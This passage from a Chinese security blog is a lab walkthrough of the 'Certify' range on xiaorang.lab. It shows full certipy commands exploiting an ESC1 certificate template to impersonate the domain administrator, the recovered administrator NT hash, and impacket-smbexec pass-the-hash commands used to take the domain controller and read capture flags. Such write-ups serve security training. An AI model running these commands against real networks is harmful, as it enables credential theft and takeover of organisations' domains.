class="line">ADBRMRMwEQYKCZImiZPyLGQBGRYDbGFiMRgwFgYKCZImiZPyLGQBGRYIeGlhb3Jh</span><br><span class="line">bmcxIDAeBgNVBAMTF3hpYW9yYW5nLVhJQU9SQU5HLURDLUNBMB4XDTI1MDgxMjE1</span><br><span class="line">MjE0MloXDTI2MDgxMjE1MjE0MlowUjETMBEGCgmSJomT8ixkARkWA2xhYjEYMBYG</span><br><span class="line">CgmSJomT8ixkARkWCHhpYW9yYW5nMQ4wDAYDVQQDEwVVc2VyczERMA8GA1UEAxMI</span><br><span class="line">emhhbmd4aWEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCjSnCuCNbW</span><br><span class="line">kmEubZP80CfHZZAuO43RvG2+szX85M/0U1rT4l4URqf4CMQLcFUBUayryanPKTi1</span><br><span class="line">ApDnp/MzND/cDIXgKuXGBOqPDbRMg66OErkf5zVgfsroYyX8ZNwRI758x9uHWTJb</span><br><span class="line">QgcY3aXNNUXHsLv/OD8ci+/VoExZHxQhPijWsTbGy4NVWi1H6ApFAf51xBkuHcOp</span><br><span class="line">rB6v7xUahhEbUfWBcy6U3Q6vQMeDZGrfocuO73hMIwmqA9orw+a1w1neMfugl+2T</span><br><span class="line">eKl815XEgsYbdH+gto98HbxIUCe2df5AqyvbDs0YlkwAjIxmWYppm+Tn2p/FQN5P</span><br><span class="line">PHQRpaf9JWmrAgMBAAGjggMPMIIDCzA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3</span><br><span class="line">FQiB3dAhhYHGIoPFkTqEjedRg9jIBiuBkpQlhInfBwIBZAIBBTApBgNVHSUEIjAg</span><br><span class="line">BgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwDgYDVR0PAQH/BAQDAgWg</span><br><span class="line">MDUGCSsGAQQBgjcVCgQoMCYwDAYKKwYBBAGCNwoDBDAKBggrBgEFBQcDBDAKBggr</span><br><span class="line">BgEFBQcDAjBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG</span><br><span class="line">9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFBXPX9TCsZVh</span><br><span class="line">KZ+0tWmPY3n1ym5MMCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlz</span><br><span class="line">dHJhdG9yMB8GA1UdIwQYMBaAFFe6Z2kqz4ktl3hku7D+cH+iSYCiMIHaBgNVHR8E</span><br><span class="line">gdIwgc8wgcyggcmggcaGgcNsZGFwOi8vL0NOPXhpYW9yYW5nLVhJQU9SQU5HLURD</span><br><span class="line">LUNBLENOPVhJQU9SQU5HLURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2</span><br><span class="line">aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXhpYW9yYW5nLERD</span><br><span class="line">PWxhYj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9</span><br><span class="line">Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcoGCCsGAQUFBwEBBIG9MIG6MIG3BggrBgEF</span><br><span class="line">BQcwAoaBqmxkYXA6Ly8vQ049eGlhb3JhbmctWElBT1JBTkctREMtQ0EsQ049QUlB</span><br><span class="line">LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp</span><br><span class="line">Z3VyYXRpb24sREM9eGlhb3JhbmcsREM9bGFiP2NBQ2VydGlmaWNhdGU/YmFzZT9v</span><br><span class="line">YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUA</span><br><span class="line">A4IBAQBo3LN+oq1KaCJ1vns4yAvI3ZOIc4lp3gx4KDL1wyDAeRnmyPNgu0TL2McP</span><br><span class="line">c91wna9m3XuzJMk70hPAmHFxyiCDEHEKXN0YNQlk8PsECKpdER/JDVzRi6aXxyUy</span><br><span class="line">+5M5IcObcbte1hfF07VO7+vXxhJHPENBJxqMokOmzEPvJV2kR2gVfEIxcZD6gYiY</span><br><span class="line">9D0h2kF8m6td7V/B3C8PmndA2/G5THVHH/+Gj86XYeahRykTA7NjwudGYtw2mm75</span><br><span class="line">o8Rbu+a65z809FujuC6hloPibxtu1Ehgrr9lLX+r9RC/n2CxUTZvRY9SmwiDwmH8</span><br><span class="line">5gbUdefdlNGsoEluWIlrx0FDtKt4</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br></pre></td></tr></table></figure>

<p>将<code>-----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----</code>复制保存为cert.pem<br>然后把cert.pem拉到本地kali<br><code>proxychains xfreerdp /u:&quot;zhangxia@xiaorang.lab&quot; /v:172.22.9.26:3389 /drive:data,/home/kali/Desktop</code><br><code>MyPass2@@6</code><br>将证书格式转换为.pfx 格式，不需要输入密码<br><code>openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</code><br>然后传回去进行下一步操作<br>使用 Rubeus 或 certipy 进行身份验证<br><code>Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password: /ptt</code><br>这个方法打不通，一直回显<strong>指定的网络密码不正确</strong>。<br>换个域外方法certipy试试<br><code>proxychains certipy-ad find -u &#39;zhangxia@xiaorang.lab&#39; -password &#39;MyPass2@@6&#39; -dc-ip 172.22.9.7 -vulnerable -stdout 2&gt;/dev/null</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 35 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 13 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via CSRA</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via CSRA: Could not connect: [Errno 111] Connection refused</span><br><span class="line">[*] Trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via RRP</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused</span><br><span class="line">[!] Failed to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27;</span><br><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    DNS Name                            : XIAORANG-DC.xiaorang.lab</span><br><span class="line">    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab</span><br><span class="line">    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class="line">    Certificate Validity Start          : 2023-07-14 04:33:21+00:00</span><br><span class="line">    Certificate Validity End            : 2028-07-14 04:43:21+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Unknown</span><br><span class="line">    Request Disposition                 : Unknown</span><br><span class="line">    Enforce Encryption for Requests     : Unknown</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : XR Manager</span><br><span class="line">    Display Name                        : XR Manager</span><br><span class="line">    Certificate Authorities             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : PublishToDs</span><br><span class="line">                                          IncludeSymmetricAlgorithms</span><br><span class="line">    Private Key Flag                    : ExportableKey</span><br><span class="line">    Extended Key Usage                  : Encrypting File System</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Domain Users</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Authenticated Users</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : XIAORANG.LAB\Administrator</span><br><span class="line">        Write Owner Principals          : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">        Write Dacl Principals           : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">        Write Property Principals       : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;XIAORANG.LAB\\Domain Users&#x27; and &#x27;XIAORANG.LAB\\Authenticated Users&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure>
<p>这里直接提示了可以打ESC1<br><code>proxychains certipy-ad req -u &#39;zhangxia@xiaorang.lab&#39; -p &#39;MyPass2@@6&#39; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &#39;xiaorang-XIAORANG-DC-CA&#39; -template &#39;XR Manager&#39; -upn &#39;administrator@xiaorang.lab&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence &#x27;\(&#x27;</span><br><span class="line">  &quot;(0x[a-zA-Z0-9]+) \([-]?[0-9]+ &quot;,</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:445  ...  OK</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 8</span><br><span class="line">[*] Got certificate with UPN &#x27;administrator@xiaorang.lab&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br></pre></td></tr></table></figure>
<p>拿到证书<br><code>proxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7 2&gt;/dev/null</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Using principal: administrator@xiaorang.lab</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@xiaorang.lab&#x27;: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80</span><br></pre></td></tr></table></figure>
<p>拿到管理员的哈希<br>然后就可以打PTH了<br><code>proxychains impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26 -codec gbk</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;type C:\Users\Administrator\flag\flag03.txt</span><br><span class="line">                                ___              .-.                </span><br><span class="line">                               (   )      .-.   /    \              </span><br><span class="line">  .--.      .--.    ___ .-.     | |_     ( __)  | .`. ;   ___  ___  </span><br><span class="line"> /    \    /    \  (   )   \   (   __)   (&#x27;&#x27;&quot;)  | |(___) (   )(   ) </span><br><span class="line">|  .-. ;  |  .-. ;  | &#x27; .-. ;   | |       | |   | |_      | |  | |  </span><br><span class="line">|  |(___) |  | | |  |  / (___)  | | ___   | |  (   __)    | |  | |  </span><br><span class="line">|  |      |  |/  |  | |         | |(   )  | |   | |       | &#x27;  | |  </span><br><span class="line">|  | ___  |  &#x27; _.&#x27;  | |         | | | |   | |   | |       &#x27;  `-&#x27; |  </span><br><span class="line">|  &#x27;(   ) |  .&#x27;.-.  | |         | &#x27; | |   | |   | |        `.__. |  </span><br><span class="line">&#x27;  `-&#x27; |  &#x27;  `-&#x27; /  | |         &#x27; `-&#x27; ;   | |   | |        ___ | |  </span><br><span class="line"> `.__,&#x27;    `.__.&#x27;  (___)         `.__.   (___) (___)      (   )&#x27; |  </span><br><span class="line">                                                           ; `-&#x27; &#x27;  </span><br><span class="line">                                                            .__.&#x27;   </span><br><span class="line"></span><br><span class="line">flag03: flag&#123;02c34eca-3bba-4123-95a8-05edcc4edbac&#125;</span><br></pre></td></tr></table></figure>

<p><code>proxychains impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7 -codec gbk</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;type C:\Users\Administrator\flag\flag04.txt</span><br><span class="line">  ______                 _  ___       </span><br><span class="line"> / _____)           _   (_)/ __)      </span><br><span class="line">| /      ____  ____| |_  _| |__ _   _ </span><br><span class="line">| |     / _  )/ ___)  _)| |  __) | | |</span><br><span class="line">| \____( (/ /| |   | |__| | |  | |_| |</span><br><span class="line"> \______)____)_|    \___)_|_|   \__  |</span><br><span class="line">                               (____/ </span><br><span class="line"></span><br><span class="line">flag04: flag&#123;d48f6f39-a0d5-4598-83e8-bed95d842c7b&#125;</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xianxinyyds.github.io">xianxin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xianxinyyds.github.io/2025/08/13/certify/">https://xianxinyyds.github.io/2025/08/13/certify/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xianxinyyds.github.io" target="_blank">仙心</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/xianxin.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/08/16/Hospital/" title="Hospital"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Hospital</div></div><div class="info-2"><div class="info-item-1">Hospital在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。 tagShiro、Fastjson、Decrypt、Nacos、内网渗透 信息收集先用fscan扫一下机器./fscan.exe -h 39.99.155.247 12345678start infoscan39.99.155.247:8080 open39.99.155.247:22 open[*] alive ports len is: 2start vulscan[*] WebTitle http://39.99.155.247:8080 code:302 len:0      title:None 跳转url: http://39.99.155.247:8080/login;jsessionid=C7B44ACB6C849F46C9D5FEBA628E5C41[*] WebTitle http://39.99.155.247:8080/login;jsessionid=C7...</div></div></div></a><a class="pagination-related" href="/2025/08/11/time/" title="time"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">time</div></div><div class="info-2"><div class="info-item-1">TimeTime是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 tagNeo4j、Privilege Elevation、Kerberos、域渗透 信息搜集先用fscan扫一下机器./fscan.exe -h 39.98.107.186 -p 1-65535 -nobr 123456789101112131415161718192021222324   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                 ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/xianxin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xianxin</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/xianxinyyds" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1090084672@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Certify"><span class="toc-number">1.</span> <span class="toc-text">Certify</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tag"><span class="toc-number">1.1.</span> <span class="toc-text">tag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%99%A819"><span class="toc-number">1.3.</span> <span class="toc-text">机器19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%99%A847"><span class="toc-number">1.4.</span> <span class="toc-text">机器47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%99%A826%E5%92%8C%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.5.</span> <span class="toc-text">机器26和域控</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/28/22%E7%BD%91%E9%BC%8E%E5%8D%8A%E5%86%B3/" title="22网鼎半决">22网鼎半决</a><time datetime="2025-08-28T15:20:58.000Z" title="发表于 2025-08-28 23:20:58">2025-08-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/24/Delegation/" title="Delegation">Delegation</a><time datetime="2025-08-24T15:20:58.000Z" title="发表于 2025-08-24 23:20:58">2025-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/23/Lilctf/" title="Lilctf">Lilctf</a><time datetime="2025-08-23T15:20:58.000Z" title="发表于 2025-08-23 23:20:58">2025-08-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/20/exchange/" title="exchange">exchange</a><time datetime="2025-08-20T15:20:58.000Z" title="发表于 2025-08-20 23:20:58">2025-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/17/nepctf/" title="nepctf">nepctf</a><time datetime="2025-08-17T15:20:58.000Z" title="发表于 2025-08-17 23:20:58">2025-08-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/789.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By xianxin</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>